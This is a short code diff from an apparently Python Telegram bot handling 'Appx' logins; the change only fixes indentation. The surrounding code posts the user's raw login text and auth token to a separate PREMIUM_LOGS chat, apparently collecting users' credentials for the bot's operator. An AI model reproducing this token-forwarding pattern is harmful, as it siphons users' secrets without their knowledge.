@@ -318,7 +318,7 @@ async def appex_v3_txt(app, message, api, name):
     dl = (f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name} \n {api_base}\n\n `{raw_text}` \n\n`{token}`\n{FFF}")
     if len(FFF) <= 4096:
         await app.send_message(PREMIUM_LOGS, dl)
-         await app.send_message(PREMIUM_LOGS, f"`{token}`")
+        await app.send_message(PREMIUM_LOGS, f"`{token}`")
         editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅\n\n`{token}`\n{FFF}")      
     else:
         plain_FFF = FFF.replace("**", "").replace("`", "")
